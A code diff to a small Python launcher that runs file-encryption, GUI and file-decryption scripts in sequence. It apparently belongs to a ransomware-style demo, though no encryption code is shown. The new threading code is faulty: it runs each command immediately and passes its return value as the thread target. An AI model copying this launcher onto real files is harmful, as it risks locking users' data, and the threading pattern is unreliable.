@@ -1,11 +1,18 @@
 from os import system
+import threading
 
 #Encrypting Files
 system('python encryptionModules/encryptTarget.py')
 
 #GUI
-system('python gui/guiWL.py ')
+guiThread= threading.Thread(target = (system('python gui/guiWL.py ')))
 
 #Decrypting Files
-system('python encryptionModules/decryptTarget.py')
+decrypThread = threading.Thread(target = (system('python encryptionModules/decryptTarget.py')))
+
+guiThread.start()
+guiThread.join()
+
+decrypThread.start()
+decrypThread.join()
 
